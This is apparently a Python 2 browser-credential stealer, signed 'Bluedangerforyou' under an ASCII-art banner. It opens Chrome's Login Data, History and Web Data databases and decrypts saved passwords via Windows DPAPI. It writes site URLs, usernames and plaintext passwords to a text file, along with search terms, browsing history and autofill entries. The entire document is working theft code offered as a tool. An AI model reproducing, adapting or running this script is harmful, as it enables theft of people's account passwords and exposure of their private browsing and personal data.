from __future__ import print_function
from os import getenv
import sqlite3
import win32crypt
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

print("""
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMM        MMMMMMMMMMMM
MMMMMMMMMM            MMMMMMMMMM
MMMMMMMMM              MMMMMMMMM
MMMMMMMM                MMMMMMMM
MMMMMMM                 MMMMMMMM
MMMMMMM                  MMMMMMM
MMMMMMM                  MMMMMMM
MMMMMMM    MMM    MMM    MMMMMMM
MMMMMMM   MMMMM   MMMM   MMMMMMM
MMMMMMM   MMMMM   MMMM   MMMMMMM
MMMMMMMM   MMMM M MMMM  MMMMMMMM
MMVKMMMM        M        MMMMMMM
MMMMMMMM       MMM      MMMMMMMM
MMMMMMMMMMMM   MMM  MMMMMMMMMMMM
MMMMMMMMMM MM       M  MMMMMMMMM
MMMMMMMMMM  M M M M M MMMMMMMMMM
MMMM  MMMMM MMMMMMMMM MMMMM   MM
MMM    MMMM M MMMMM M MMMM    MM
MMM    MMMM   M M M  MMMMM   MMM
MMMM    MMMM         MMM      MM
MMM       MMMM     MMMM       MM
MMM         MMMMMMMM      M  MMM
MMMM  MMM      MMM      MMMMMMMM
MMMMMMMMMMM  MM       MMMMMMM  M
MMM  MMMMMMM       MMMMMMMMM   M
MM    MMM        MM            M
MM            MMMM            MM
MMM        MMMMMMMMMMMMM       M
MM      MMMMMMMMMMMMMMMMMMM    M
MMM   MMMMMMMMMMMMMMMMMMMMMM   M
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
By Bluedangerforyou
""")
f = open("passwordsusers.txt", "w")
username1 = "Username: "
siteId = "Site ID: "
password_field = "Password: "
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
conn4 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
cursor3 = conn3.cursor()
cursor1 = conn1.cursor()
cursor4 = conn4.cursor()
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		f.writelines(siteId + result[0] + '\n' + username1 + result[1] + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
		
f1 = open('keywordsearches.txt','w')		
cursor3.execute("SELECT * FROM keyword_search_terms") 
print('---------------------------------------------')
print("Google Keyword Searches:")
result3 = cursor3.fetchall() 
for r3 in result3:
        #print (r3[2] + '\n')
        f1.writelines(str(r3[2] + '\n'))
        
        
f2 = open('history.txt', 'w')
cursor3.execute("SELECT * FROM urls") 
print('---------------------------------------------')
print("Google History:")
result4 = cursor3.fetchall() 
for r4 in result4:
        f2.writelines(str('\n' + r4[1] + '\n'))

f6 = open('autofill.txt','w')
cursor4.execute("SELECT * FROM autofill")
print('---------------------------------------------')
print("Autofill:")
result1 = cursor4.fetchall() 
for r6 in result1:
	f6.writelines(str('\n' + r6[1]))

raw_input()
